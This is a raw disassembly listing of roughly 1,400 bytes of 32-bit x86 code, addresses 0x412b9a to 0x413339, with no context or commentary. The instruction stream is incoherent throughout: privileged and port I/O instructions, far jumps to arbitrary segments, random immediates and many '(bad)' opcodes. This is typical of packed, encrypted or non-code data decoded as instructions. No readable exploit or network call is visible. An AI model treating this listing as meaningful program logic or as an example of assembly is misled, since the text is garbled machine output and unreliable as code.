  412b9a:	add    dh,bl
  412b9c:	mov    ecx,0xb04c3853
  412ba1:	adc    eax,DWORD PTR [ebx]
  412ba3:	jle    0x412b68
  412ba5:	loopne 0x412b71
  412ba7:	xchg   ecx,eax
  412ba8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412ba9:	add    ebx,0xd4ad26ad
  412baf:	adc    BYTE PTR [esi-0x708c1651],0xff
  412bb6:	mov    ebx,0x7e1249cc
  412bbb:	cmc    
  412bbc:	aam    0xe4
  412bbe:	mov    edi,0x9773b534
  412bc3:	jmp    0x1f1a:0x9a353f8f
  412bca:	repz addr16 into 
  412bcd:	xor    dl,BYTE PTR [ebp+0x5d]
  412bd0:	popf   
  412bd1:	cwde   
  412bd2:	cdq    
  412bd3:	ficom  DWORD PTR [ecx+0x3d]
  412bd6:	and    ebx,DWORD PTR ds:0x4df379d5
  412bdc:	inc    edi
  412bdd:	mov    al,0x6d
  412bdf:	mov    cl,0x60
  412be1:	fld    st(3)
  412be3:	in     al,0xd4
  412be5:	rcr    DWORD PTR [edx-0x15ab99d4],1
  412beb:	inc    ebx
  412bec:	lahf   
  412bed:	vmread DWORD PTR [eiz*8+0x4bd54525],eax
  412bf5:	adc    esi,DWORD PTR [edx-0x6]
  412bf8:	loop   0x412bec
  412bfa:	add    eax,0x8e9ef531
  412bff:	dec    ebx
  412c00:	pop    ebp
  412c01:	lods   al,BYTE PTR ds:[esi]
  412c02:	gs adc al,0xa
  412c05:	imul   esp,DWORD PTR [edx],0xffffffe7
  412c08:	push   ecx
  412c09:	hlt    
  412c0a:	mov    cl,0x82
  412c0c:	iret   
  412c0d:	rol    BYTE PTR ss:[ebp+0x55635039],1
  412c14:	jae    0x412bd9
  412c16:	cmp    BYTE PTR [ebx],bh
  412c18:	inc    esp
  412c19:	or     eax,0xd63c307f
  412c1e:	lds    ebx,FWORD PTR [edx]
  412c20:	shl    DWORD PTR [ecx],0x75
  412c23:	mov    WORD PTR [esi],ss
  412c25:	scas   eax,DWORD PTR es:[edi]
  412c26:	out    0x9b,eax
  412c28:	xchg   esi,eax
  412c29:	and    dl,ch
  412c2b:	stc    
  412c2c:	outs   dx,BYTE PTR ds:[esi]
  412c2d:	cmp    ebx,ebx
  412c2f:	es mul BYTE PTR cs:[edi+0x4f43021]
  412c37:	ret    0xaf68
  412c3a:	push   0x3e
  412c3c:	ds xor al,0x4e
  412c3f:	aam    0x5d
  412c41:	(bad)
  412c45:	outs   dx,DWORD PTR ds:[esi]
  412c46:	push   ss
  412c47:	xor    al,0x33
  412c49:	mov    dh,0xec
  412c4b:	test   al,0xc0
  412c4d:	sub    eax,0xa4bed6a2
  412c52:	cmp    edi,0x79bd6a70
  412c58:	jmp    DWORD PTR [esi+eiz*2+0x25]
  412c5c:	mov    al,0x92
  412c5e:	jmp    0xb449:0x1073fb03
  412c65:	ja     0x412c20
  412c67:	int3   
  412c68:	(bad)  
  412c69:	in     eax,0xb5
  412c6b:	repnz (bad)
  412c6e:	aas    
  412c6f:	xchg   edx,eax
  412c70:	pop    esi
  412c71:	mov    esp,0x3da6e80b
  412c76:	jo     0x412ca6
  412c78:	dec    eax
  412c79:	adc    al,0xe0
  412c7b:	inc    ebp
  412c7c:	dec    edi
  412c7d:	adc    ecx,0xffffffab
  412c80:	shl    BYTE PTR [edx+0x7],cl
  412c83:	leave  
  412c84:	mov    eax,ds:0xc10f3e43
  412c89:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412c8a:	push   cs
  412c8b:	aaa    
  412c8c:	and    al,0x81
  412c8e:	mov    ebx,0x881864a
  412c93:	fwait
  412c94:	push   esp
  412c95:	bts    DWORD PTR [eax-0x17ce16e2],esp
  412c9c:	sub    eax,0xdf8c128c
  412ca1:	fstp   TBYTE PTR [ebp+edx*1+0x71e2d33]
  412ca8:	cli    
  412ca9:	jbe    0x412cf3
  412cab:	jmp    0x412c60
  412cad:	mov    ebp,0xfc42dba4
  412cb2:	retf   
  412cb3:	int3   
  412cb4:	push   ebx
  412cb5:	xchg   ebx,eax
  412cb6:	add    ecx,DWORD PTR ds:0xe61c12b4
  412cbc:	out    0xbf,al
  412cbe:	les    edx,FWORD PTR [ecx+ebp*1]
  412cc1:	inc    esp
  412cc2:	sti    
  412cc3:	lea    esi,[edi+edi*2]
  412cc6:	aaa    
  412cc7:	icebp  
  412cc8:	jo     0x412d18
  412cca:	pop    eax
  412ccb:	idiv   DWORD PTR [ebx-0x48]
  412cce:	stc    
  412ccf:	sub    ecx,DWORD PTR [edx+0x2334f286]
  412cd5:	leave  
  412cd6:	fimul  WORD PTR [edi]
  412cd8:	pop    esp
  412cd9:	out    0xc2,eax
  412cdb:	inc    ebx
  412cdc:	sub    eax,0x37
  412cdf:	bound  eax,QWORD PTR [edi+0x21bd1984]
  412ce5:	jl     0x412d58
  412ce7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412ce8:	cmp    eax,0x2fb7e9a5
  412ced:	jb     0x412d5d
  412cef:	xchg   edx,eax
  412cf0:	in     eax,dx
  412cf1:	into   
  412cf2:	jmp    0xa743:0x8b1a525a
  412cf9:	mov    edx,0x1f1f1c42
  412cfe:	inc    ecx
  412cff:	bswap  eax
  412d01:	fiadd  WORD PTR es:[eax+0x4235291f]
  412d08:	ins    BYTE PTR es:[edi],dx
  412d09:	ret    0xd40d
  412d0c:	or     al,0xa0
  412d0e:	adc    dh,bl
  412d10:	xchg   edx,eax
  412d11:	dec    esp
  412d12:	pop    es
  412d13:	xor    al,BYTE PTR [edx+0x6d]
  412d16:	cdq    
  412d17:	fdivr  st(0),st
  412d19:	retf   
  412d1a:	popa   
  412d1b:	xchg   ebp,eax
  412d1c:	mov    ds:0x9d791d12,eax
  412d21:	shl    BYTE PTR [eax],cl
  412d23:	or     eax,DWORD PTR [ebp+0x28]
  412d26:	sahf   
  412d27:	inc    edi
  412d28:	or     eax,DWORD PTR [edx]
  412d2a:	xchg   edi,eax
  412d2c:	xor    eax,DWORD PTR [ebx-0x6b]
  412d2f:	sbb    DWORD PTR [ebx+0x3a6d4053],ebp
  412d35:	mov    bl,0x55
  412d37:	enter  0x3de9,0x37
  412d3b:	push   edx
  412d3c:	cli    
  412d3d:	jbe    0x412cc6
  412d3f:	iret   
  412d40:	ss repz pop edx
  412d43:	mov    bl,0xbe
  412d45:	pop    ds
  412d46:	cdq    
  412d47:	mov    esp,eax
  412d49:	fwait
  412d4a:	out    0xfd,eax
  412d4c:	jo     0x412d2c
  412d4e:	push   ecx
  412d4f:	dec    ebx
  412d50:	inc    ecx
  412d51:	push   ds
  412d52:	cmp    eax,0xad24073c
  412d57:	std    
  412d58:	cs dec esp
  412d5a:	fs inc ebp
  412d5c:	xor    esi,DWORD PTR [ebx]
  412d5e:	dec    DWORD PTR [ebx]
  412d60:	xor    al,0xd1
  412d62:	test   BYTE PTR [eax],0x3b
  412d65:	rcl    ch,0x73
  412d68:	jae    0x412d12
  412d6a:	aad    0x67
  412d6c:	jae    0x412d95
  412d6e:	cs push ss
  412d70:	push   ebx
  412d71:	je     0x412d45
  412d73:	pusha  
  412d74:	pusha  
  412d75:	leave  
  412d76:	mov    WORD PTR [ecx],dx
  412d79:	iret   
  412d7a:	cmp    esp,DWORD PTR [esp+edx*2-0xc]
  412d7e:	es dec edi
  412d80:	xchg   ebp,eax
  412d81:	inc    esi
  412d82:	or     dh,BYTE PTR [ecx-0x40]
  412d85:	test   DWORD PTR ds:0x306fff56,ecx
  412d8b:	dec    ecx
  412d8c:	adc    BYTE PTR [edx],bh
  412d8e:	dec    ebx
  412d8f:	aad    0x45
  412d91:	nop
  412d92:	pop    ebx
  412d93:	and    ah,BYTE PTR [ebx]
  412d95:	icebp  
  412d96:	jecxz  0x412d2b
  412d98:	test   al,0x79
  412d9a:	push   eax
  412d9b:	sbb    eax,0x93f9d340
  412da0:	pop    ds
  412da1:	pop    ss
  412da2:	lahf   
  412da3:	cwde   
  412da4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412da5:	arpl   WORD PTR [edi-0x72],dx
  412da8:	outs   dx,DWORD PTR ds:[esi]
  412da9:	jnp    0x412dab
  412dab:	jo     0x412e28
  412dad:	retf   0x98c6
  412db0:	loop   0x412dbb
  412db2:	mov    ds:0xf9d20de8,al
  412db7:	pop    es
  412db8:	shr    DWORD PTR [edi+0x6a],1
  412dbb:	ret    
  412dbc:	and    BYTE PTR [edx-0x7b],bh
  412dbf:	adc    DWORD PTR [edx+0x3f1514c],eax
  412dc5:	jb     0x412e46
  412dc7:	js     0x412e48
  412dc9:	loopne 0x412d79
  412dcb:	xchg   al,al
  412dcd:	push   0x2f1a5361
  412dd2:	inc    esp
  412dd3:	int    0xde
  412dd5:	dec    ebx
  412dd6:	sti    
  412dd7:	mov    ah,0xc1
  412dd9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412dda:	or     al,0x51
  412ddc:	std    
  412ddd:	xor    esi,DWORD PTR [esi+0x21c1ff53]
  412de3:	cmp    al,0x48
  412de5:	push   ebp
  412de6:	pushw  es
  412de8:	and    bh,BYTE PTR [esi]
  412dea:	jmp    0xaaf7:0xe4c087b9
  412df1:	int3   
  412df2:	add    eax,0xa4739454
  412df7:	add    dl,BYTE PTR [edi-0x5e]
  412dfa:	jg     0x412e54
  412dfc:	pop    ebx
  412dfd:	xchg   esp,eax
  412dfe:	mov    ecx,0x3e797b21
  412e03:	lea    ebx,[ebx]
  412e05:	xchg   ebx,eax
  412e06:	sbb    BYTE PTR [esi+0x1bf3e98c],dl
  412e0c:	push   0x63294a5b
  412e11:	push   es
  412e12:	stos   DWORD PTR es:[edi],eax
  412e13:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412e14:	jp     0x412e37
  412e16:	xor    eax,0xf4804ba4
  412e1b:	inc    edx
  412e1c:	sbb    al,bl
  412e1e:	test   ecx,edi
  412e20:	loop   0x412e2f
  412e22:	repnz pop esi
  412e24:	add    eax,0xfef02f16
  412e29:	inc    edx
  412e2a:	jl     0x412e2a
  412e2c:	jae    0x412e7e
  412e2e:	push   0xd3733cbe
  412e33:	sub    eax,0x597cdc15
  412e38:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412e39:	pop    edi
  412e3a:	ds gs adc dl,bl
  412e3e:	cli    
  412e3f:	sub    ebx,ebp
  412e41:	out    dx,eax
  412e42:	loope  0x412e71
  412e44:	jl     0x412df8
  412e46:	fsubr  st(4),st
  412e48:	mov    bh,0xaf
  412e4a:	lods   al,BYTE PTR es:[esi]
  412e4c:	rcr    DWORD PTR gs:[edx-0x4ce3ca26],0xe1
  412e54:	sbb    edx,edx
  412e56:	jo     0x412ddb
  412e58:	out    0xce,eax
  412e5a:	mov    cl,0x9
  412e5c:	adc    dl,bl
  412e5e:	add    bh,BYTE PTR [ecx+0x37a9c56]
  412e64:	dec    esp
  412e65:	lock loope 0x412e9f
  412e68:	xchg   DWORD PTR ds:0x144937c6,esi
  412e6e:	jg     0x412df6
  412e70:	in     eax,dx
  412e71:	xchg   edx,eax
  412e72:	data16 fisubr WORD PTR [edi]
  412e75:	or     ebp,ebp
  412e77:	cmp    eax,esp
  412e79:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412e7a:	fbstp  TBYTE PTR [eax-0x2061e503]
  412e80:	jns    0x412e4f
  412e82:	pop    esp
  412e83:	mov    dh,ch
  412e85:	cdq    
  412e86:	inc    ebp
  412e87:	stos   BYTE PTR es:[edi],al
  412e88:	dec    esi
  412e89:	arpl   WORD PTR [ebp+0x2157c26a],dx
  412e8f:	dec    BYTE PTR [ebx+0xf]
  412e92:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412e93:	pop    edi
  412e94:	jnp    0x412ed3
  412e96:	arpl   WORD PTR [ebp-0x69],bx
  412e99:	pop    eax
  412e9a:	dec    ecx
  412e9b:	dec    DWORD PTR [ebx]
  412e9d:	pop    ds
  412e9e:	sub    edx,DWORD PTR [esp+eax*4]
  412ea1:	in     eax,dx
  412ea2:	mov    dl,0xa6
  412ea4:	add    DWORD PTR [edi],ebx
  412ea6:	mov    ebx,0x964cd693
  412eab:	fcmovb st,st(2)
  412ead:	sti    
  412eae:	mov    bl,0x42
  412eb0:	adc    ebx,DWORD PTR [ebx+0x542da68b]
  412eb6:	mov    esp,0x6cbf64f7
  412ebb:	mov    ch,0x53
  412ebd:	pop    ecx
  412ebe:	(bad)  
  412ec0:	ins    BYTE PTR es:[di],dx
  412ec2:	(bad)  
  412ec3:	cwde   
  412ec4:	call   0x5865:0xb9830b99
  412ecb:	add    DWORD PTR [ebp+0x59],esi
  412ece:	xchg   DWORD PTR [ebx-0x6e],ebp
  412ed1:	aas    
  412ed2:	rol    DWORD PTR [ebx],1
  412ed4:	jns    0x412f22
  412ed6:	cmp    DWORD PTR [ebx-0x3a3f9623],ebp
  412edc:	in     al,dx
  412edd:	ins    DWORD PTR es:[edi],dx
  412ede:	sub    edx,DWORD PTR [ecx]
  412ee0:	je     0x412ebc
  412ee2:	aam    0xaf
  412ee4:	stos   BYTE PTR es:[edi],al
  412ee5:	cs ins BYTE PTR es:[edi],dx
  412ee7:	shl    BYTE PTR [esi],0x42
  412eea:	push   edi
  412eeb:	imul   ecx,DWORD PTR [ebx-0xa2f624e],0x76
  412ef2:	cmp    ebx,ebp
  412ef4:	xor    BYTE PTR [edx+0x2a],dh
  412ef7:	stos   BYTE PTR es:[edi],al
  412ef8:	hlt    
  412ef9:	pop    edx
  412efa:	pop    edx
  412efb:	dec    esi
  412efc:	mov    bh,0x6f
  412efe:	js     0x412f65
  412f00:	loope  0x412eb6
  412f02:	mov    fs,WORD PTR [edi-0x72]
  412f05:	ds ss aas 
  412f08:	in     al,dx
  412f09:	adc    dh,al
  412f0b:	inc    esp
  412f0c:	jle    0x412f1c
  412f0e:	sti    
  412f0f:	leave  
  412f10:	fsub   DWORD PTR ds:0x97ae7a6
  412f16:	ins    DWORD PTR es:[edi],dx
  412f17:	aas    
  412f18:	dec    esp
  412f19:	rcl    BYTE PTR [edi+0xb],0xba
  412f1d:	pop    esi
  412f1e:	fild   QWORD PTR ds:0xcaea82af
  412f24:	pop    esi
  412f25:	xor    al,0x80
  412f27:	clc    
  412f28:	rcl    BYTE PTR [ebp+0x5d21cd73],0x6b
  412f2f:	inc    edi
  412f30:	inc    edx
  412f31:	push   edi
  412f32:	call   0xa6b886cc
  412f37:	pop    eax
  412f38:	bnd call 0xbb5818fa
  412f3e:	lock and eax,0x5092e038
  412f44:	in     al,0x66
  412f46:	jns    0x412f01
  412f48:	int    0xff
  412f4a:	aaa    
  412f4b:	mov    esp,0xcfda9785
  412f50:	(bad)  
  412f51:	bound  ebp,QWORD PTR [edi-0x788bf42b]
  412f57:	cwde   
  412f58:	iret   
  412f59:	repz mov al,0x38
  412f5c:	xor    al,0x1a
  412f5e:	dec    edx
  412f5f:	(bad)
  412f62:	sub    esi,edx
  412f64:	sbb    al,0x8a
  412f66:	fxch   st(2)
  412f68:	(bad)  
  412f69:	mov    ebp,0x8e874a21
  412f6e:	add    esp,DWORD PTR [ecx]
  412f70:	out    0xd7,al
  412f72:	into   
  412f73:	xchg   esi,eax
  412f74:	push   ebp
  412f75:	fsubrp st(5),st
  412f77:	adc    bh,dl
  412f79:	aaa    
  412f7a:	push   0x70
  412f7c:	xor    DWORD PTR [eax-0xf],edx
  412f7f:	retf   0x63fb
  412f82:	pop    ss
  412f83:	pop    esp
  412f84:	(bad)  
  412f85:	jge    0x412fc7
  412f87:	leave  
  412f88:	jg     0x412fb9
  412f8a:	rol    DWORD PTR [eax+eiz*2],0x46
  412f8e:	sbb    BYTE PTR [edi-0x5c3beae0],ch
  412f94:	ss adc al,0xdb
  412f97:	ret    
  412f98:	in     al,0xc3
  412f9a:	mov    bh,0x84
  412f9c:	mov    ds:0xa1816712,eax
  412fa1:	dec    ebp
  412fa2:	repz std 
  412fa4:	rcl    dl,cl
  412fa6:	enter  0xf54f,0xf8
  412faa:	aaa    
  412fab:	mov    cl,0x10
  412fad:	bound  ebx,QWORD PTR [esi+eiz*2]
  412fb0:	ja     0x412f6c
  412fb2:	push   ss
  412fb3:	sbb    al,0x9d
  412fb5:	jne    0x412f6f
  412fb7:	call   0xef3:0xeb9a02b
  412fbe:	les    edx,FWORD PTR [eax-0x65]
  412fc1:	mov    bl,0x61
  412fc3:	xlat   BYTE PTR ds:[ebx]
  412fc4:	je     0x413033
  412fc6:	or     cl,ah
  412fc8:	xor    cl,BYTE PTR [esi+0x11c6c02]
  412fce:	push   0xfdf5f405
  412fd3:	out    dx,eax
  412fd4:	fs mov al,0xcb
  412fd7:	jne    0x41302a
  412fd9:	(bad)  
  412fda:	cmp    ecx,edx
  412fdc:	sbb    eax,0xcc27f221
  412fe1:	jge    0x412fca
  412fe3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412fe4:	cdq    
  412fe5:	sub    dl,0x91
  412fe8:	dec    ebp
  412fe9:	in     eax,0xdb
  412feb:	loop   0x412fde
  412fed:	(bad)  
  412fee:	jecxz  0x412f92
  412ff0:	xchg   esi,eax
  412ff1:	sbb    ecx,DWORD PTR [ebp+0x52af071c]
  412ff7:	mov    WORD PTR [ecx],es
  412ff9:	dec    edx
  412ffa:	adc    eax,0xf2dfd7b5
  412fff:	cmp    ecx,edx
  413001:	fistp  QWORD PTR [esi-0x69]
  413004:	cmp    eax,0xc656570d
  413009:	jmp    0x185d3eb4
  41300e:	xchg   edx,eax
  41300f:	sti    
  413010:	daa    
  413011:	ja     0x41306b
  413013:	jmp    0x413081
  413015:	and    edx,DWORD PTR [edx]
  413017:	pop    esi
  413018:	dec    eax
  413019:	push   ebx
  41301a:	addr16 dec ecx
  41301c:	push   esi
  41301d:	jmp    0x412fa0
  41301f:	jbe    0x413072
  413021:	pop    edx
  413022:	dec    edi
  413023:	icebp  
  413024:	sub    edi,DWORD PTR [edx]
  413026:	shr    BYTE PTR [ebp+esi*1-0x198f4ee1],0xb0
  41302e:	xchg   edi,eax
  41302f:	ret    
  413030:	jb     0x413027
  413032:	and    BYTE PTR [esi-0x3af1535],ch
  413038:	jge    0x4130b6
  41303a:	daa    
  41303b:	cmp    BYTE PTR [ebp-0x1e],bl
  41303e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41303f:	sub    eax,0xb0dd005c
  413044:	fdivr  DWORD PTR [eax+0x63f560a7]
  41304a:	out    dx,al
  41304b:	adc    DWORD PTR [esi+esi*4],0xffffffb2
  41304f:	sub    eax,0xc013e4a3
  413054:	fwait
  413055:	loopne 0x41305e
  413057:	out    dx,al
  413058:	sar    DWORD PTR [ebx-0x5fb93d7f],cl
  41305e:	test   eax,0x3b163628
  413063:	sbb    eax,ebx
  413065:	push   0x6b4a3318
  41306a:	shl    BYTE PTR [eax+0x249efa31],1
  413070:	leave  
  413071:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413072:	pop    ds
  413073:	sti    
  413074:	and    al,0x26
  413076:	bound  ebx,QWORD PTR [ebp-0x34]
  413079:	sbb    ebx,DWORD PTR [edx]
  41307b:	and    BYTE PTR [eax-0x38],dh
  41307e:	adc    eax,0xf09d60ad
  413083:	mov    eax,0x32360d3f
  413088:	push   ss
  413089:	jb     0x4130f2
  41308b:	retf   
  41308c:	inc    esi
  41308d:	fisub  DWORD PTR [edx*8+0x4efbe8f3]
  413094:	test   BYTE PTR [ecx],ch
  413096:	pop    esp
  413097:	ins    DWORD PTR es:[edi],dx
  413098:	pop    ebx
  413099:	mov    eax,0x41fd4b06
  41309e:	(bad)  
  41309f:	loop   0x4130a5
  4130a1:	mov    ebx,0x2ce70c98
  4130a6:	pop    ss
  4130a7:	lds    ecx,FWORD PTR [esi]
  4130a9:	sbb    eax,0xf3e00b23
  4130ae:	mov    DWORD PTR [esi],edi
  4130b0:	sub    al,0xc0
  4130b2:	pop    ebp
  4130b3:	out    dx,al
  4130b4:	bound  ebp,QWORD PTR [esi+0x136409b]
  4130ba:	retf   0xf441
  4130bd:	aas    
  4130be:	adc    bl,BYTE PTR [ebp-0x734cacac]
  4130c4:	jecxz  0x41307d
  4130c6:	sub    dh,BYTE PTR [eax+0x18]
  4130c9:	xchg   esi,eax
  4130ca:	scas   eax,DWORD PTR es:[edi]
  4130cb:	(bad)  
  4130cc:	jbe    0x413091
  4130ce:	dec    ebx
  4130cf:	xchg   esp,eax
  4130d0:	dec    eax
  4130d1:	ja     0x4130c8
  4130d3:	pop    esi
  4130d4:	test   DWORD PTR [ecx-0x36bd21f],ebp
  4130da:	mov    edi,0xdecab085
  4130df:	retf   
  4130e0:	push   eax
  4130e1:	idiv   ch
  4130e3:	cld    
  4130e4:	jne    0x4130f8
  4130e6:	mov    esi,edx
  4130e8:	pusha  
  4130e9:	jne    0x41309c
  4130eb:	iret   
  4130ec:	mov    eax,ds:0x8690731c
  4130f1:	mov    bl,al
  4130f3:	sbb    edi,edx
  4130f5:	mov    WORD PTR [ecx],ss
  4130f7:	popf   
  4130f8:	(bad)  
  4130f9:	pop    esi
  4130fa:	and    al,0x3b
  4130fc:	ds sbb al,0x1a
  4130ff:	sbb    al,0x8f
  413101:	aas    
  413102:	fucomp st(2)
  413104:	mov    bl,0xed
  413106:	jmp    0xe6280e3c
  41310b:	xlat   BYTE PTR ds:[ebx]
  41310c:	xor    al,0x62
  41310e:	lds    ebx,FWORD PTR [ebx]
  413110:	xor    eax,0xde7e9b2c
  413115:	stos   DWORD PTR es:[edi],eax
  413116:	fdiv   DWORD PTR [edi+0x10]
  413119:	or     bl,BYTE PTR [esi-0x421939fb]
  41311f:	cmp    ebp,DWORD PTR ds:0x5f7ecab4
  413125:	imul   eax,DWORD PTR [ecx],0xf92be515
  41312b:	rol    DWORD PTR [ebp*1-0x7fa8298c],cl
  413132:	xor    dh,dh
  413134:	inc    esp
  413135:	(bad)  
  413136:	xlat   BYTE PTR ds:[ebx]
  413137:	sahf   
  413138:	popa   
  413139:	xchg   edi,eax
  41313a:	lahf   
  41313b:	and    DWORD PTR [edi],ebx
  41313d:	aam    0x55
  41313f:	sbb    BYTE PTR [esi],bh
  413141:	nop
  413142:	mov    bh,0xe0
  413144:	cmp    edi,ebp
  413146:	push   eax
  413147:	cld    
  413148:	(bad)  
  41314a:	(bad)  
  41314b:	out    0x41,eax
  41314d:	in     eax,dx
  41314e:	cmp    BYTE PTR [ebp+0x43],0x85
  413152:	cmp    DWORD PTR [edi],eax
  413154:	pop    edx
  413155:	dec    eax
  413156:	sub    eax,0x64e824b8
  41315b:	sbb    BYTE PTR [ecx],cl
  41315d:	and    eax,DWORD PTR [eax+ebx*8+0x62]
  413161:	addr16 test al,0xec
  413164:	pop    edx
  413165:	sub    DWORD PTR [edx+0x7506c86b],edi
  41316b:	(bad)  
  41316c:	dec    ebp
  41316d:	into   
  41316e:	pusha  
  41316f:	dec    ebx
  413170:	jo     0x41310c
  413172:	std    
  413173:	sub    esi,DWORD PTR [esi]
  413175:	sub    ecx,DWORD PTR [ecx-0x7e2a351f]
  41317b:	push   ecx
  41317c:	xor    DWORD PTR [edx+0x22],eax
  41317f:	jo     0x4131eb
  413181:	cli    
  413182:	test   cl,bh
  413184:	scas   al,BYTE PTR es:[edi]
  413185:	adc    bl,BYTE PTR [edi-0x53]
  413188:	dec    ecx
  413189:	mov    WORD PTR [ebx],bx
  41318c:	lahf   
  41318d:	addr16 fwait
  41318f:	in     eax,dx
  413190:	pop    ecx
  413191:	je     0x41314a
  413193:	out    dx,al
  413194:	inc    DWORD PTR [eax+0x705fd999]
  41319a:	aaa    
  41319b:	cmp    esi,eax
  41319d:	dec    BYTE PTR [edx]
  41319f:	push   0xac664222
  4131a4:	test   ecx,edi
  4131a6:	mov    ah,0x67
  4131a8:	scas   eax,DWORD PTR es:[edi]
  4131a9:	outs   dx,DWORD PTR ds:[esi]
  4131aa:	nop
  4131ab:	jae    0x413187
  4131ad:	dec    BYTE PTR [edx+0x35a17429]
  4131b3:	adc    al,0x8b
  4131b5:	shr    al,cl
  4131b7:	rcr    DWORD PTR [eax+ebx*8],cl
  4131ba:	and    eax,0x84cd21ef
  4131bf:	popa   
  4131c0:	lock sbb al,0xe9
  4131c3:	ins    DWORD PTR es:[edi],dx
  4131c4:	aam    0xc4
  4131c6:	mov    eax,ds:0x470c8785
  4131cb:	inc    esi
  4131cc:	dec    ebx
  4131cd:	dec    eax
  4131ce:	add    al,BYTE PTR [eax-0x63b74f27]
  4131d4:	sbb    eax,0x633fa3c4
  4131d9:	mov    dh,0x19
  4131db:	mov    cl,0xcb
  4131dd:	and    DWORD PTR [ebp+0x1eff66a0],0x49
  4131e4:	(bad)  
  4131e5:	lock sub al,0x6f
  4131e8:	pandn  mm7,mm7
  4131eb:	push   ebp
  4131ec:	js     0x4131ea
  4131ee:	fstp   DWORD PTR [esp+eiz*2-0x6f]
  4131f2:	sbb    edx,ebp
  4131f4:	pop    edx
  4131f5:	ins    BYTE PTR es:[edi],dx
  4131f6:	out    0xc9,eax
  4131f8:	sbb    dl,ah
  4131fa:	mov    ecx,0x10f25205
  4131ff:	lahf   
  413200:	and    eax,0xd7f91832
  413205:	frstor [ebx+ecx*8]
  413208:	jge    0x413207
  41320a:	in     eax,dx
  41320b:	mov    ds:0xb245e182,al
  413210:	mov    ds:0x81b7cb21,eax
  413215:	pop    esp
  413216:	pop    ebx
  413217:	dec    edx
  413218:	jg     0x413224
  41321a:	xlat   BYTE PTR ds:[ebx]
  41321b:	inc    eax
  41321c:	cmp    eax,0x7f7bd862
  413221:	clc    
  413222:	mov    dh,0x1e
  413224:	push   DWORD PTR [edx]
  413226:	leave  
  413227:	into   
  413228:	fbstp  TBYTE PTR [edx+ebp*2-0x34]
  41322c:	sub    al,0x78
  41322e:	loopne 0x41329c
  413230:	adc    DWORD PTR [ebx-0x57],0xffffffba
  413234:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413235:	test   ch,al
  413237:	les    edi,FWORD PTR [eax+0x36ca0767]
  41323d:	mov    ch,0xea
  41323f:	icebp  
  413240:	retf   
  413241:	pop    ecx
  413242:	stos   BYTE PTR es:[edi],al
  413243:	mov    ds:0xdd53f8f7,al
  413248:	dec    esi
  413249:	push   ds
  41324a:	mov    dh,0xf0
  41324c:	sub    ecx,DWORD PTR [ebp+0x4a]
  41324f:	sub    al,0x3
  413251:	stos   DWORD PTR es:[edi],eax
  413252:	popa   
  413253:	sub    BYTE PTR [eax+0x12],0xe5
  413257:	cmp    al,0x70
  413259:	aad    0x9b
  41325b:	mov    ebp,0x7cfc92f1
  413260:	rcl    DWORD PTR [ebp-0x61960987],1
  413266:	mov    ch,0xf6
  413268:	inc    ecx
  413269:	adc    BYTE PTR [edx],ch
  41326b:	pop    edx
  41326c:	mov    dh,0xf3
  41326e:	gs int 0x85
  413271:	paddusw mm6,QWORD PTR [ebx-0x4a]
  413275:	and    ebp,DWORD PTR [edx+eax*2-0x5067a4b2]
  41327c:	mov    eax,ds:0x7cd739b6
  413281:	adc    al,0xf8
  413283:	dec    edi
  413284:	fld    DWORD PTR [ecx]
  413286:	cmp    DWORD PTR [edx-0x1c],0xfffffffb
  41328a:	pop    es
  41328b:	sub    ebp,DWORD PTR [edi-0x7c]
  41328e:	lahf   
  41328f:	mov    eax,ds:0x5e1c661a
  413294:	push   ecx
  413295:	xor    al,BYTE PTR [esi-0x26]
  413298:	repnz pop es
  41329a:	pop    edi
  41329b:	iret   
  41329c:	inc    ebx
  41329d:	jle    0x413319
  41329f:	mov    ecx,0x94aa9ea5
  4132a4:	push   0xffffff87
  4132a6:	cmp    BYTE PTR [ebp-0xd],ch
  4132a9:	mov    DWORD PTR [ecx+0x32],edx
  4132ac:	call   0x28291421
  4132b1:	jmp    0x4132c6
  4132b3:	sbb    DWORD PTR [edi+esi*1-0x2ace5d26],ebp
  4132ba:	clc    
  4132bb:	loope  0x413247
  4132bd:	mov    al,ds:0x9b760d89
  4132c2:	mov    ?,WORD PTR [esp+ebp*1]
  4132c5:	in     eax,0xd2
  4132c7:	jno    0x4132e2
  4132c9:	adc    ch,dh
  4132cb:	lods   eax,DWORD PTR ds:[esi]
  4132cc:	into   
  4132cd:	stc    
  4132ce:	add    ch,BYTE PTR [edx+eax*8-0x7b]
  4132d2:	(bad)  
  4132d3:	call   0x4c16d09d
  4132d8:	mov    ecx,0x1b8097d6
  4132dd:	repz ret 0x1159
  4132e1:	pushf  
  4132e2:	xlat   BYTE PTR ds:[ebx]
  4132e3:	jg     0x4132dd
  4132e5:	outs   dx,BYTE PTR ds:[esi]
  4132e6:	xchg   ebx,eax
  4132e7:	mov    ebx,0x8dfa9663
  4132ec:	repz mov ds:0xfe0ba8c3,al
  4132f2:	dec    esp
  4132f3:	or     BYTE PTR [ecx],dl
  4132f5:	sbb    eax,0xd8584d80
  4132fa:	mov    dh,0xf8
  4132fc:	frstor ds:0x7b431069
  413302:	or     DWORD PTR [edi+0x809dbc5],esi
  413308:	popa   
  413309:	mov    ecx,0x5fb9878e
  41330e:	add    esp,ecx
  413310:	mov    ?,WORD PTR [esi-0x6fe16e22]
  413316:	mov    fs,WORD PTR [ecx]
  413318:	sub    dh,BYTE PTR [esp+esi*8+0x18]
  41331c:	or     ebp,DWORD PTR [edi-0x2b]
  41331f:	pop    ebp
  413320:	test   al,bl
  413322:	repnz sub eax,0xca7528b9
  413328:	xor    ah,BYTE PTR [edx+ecx*1]
  41332b:	inc    eax
  41332c:	sub    al,0xdc
  41332e:	retf   
  41332f:	jbe    0x41339d
  413331:	popa   
  413332:	loope  0x41332b
  413334:	repnz xor ah,BYTE PTR [edi]
  413337:	loopne 0x413324
  413339:	cli    
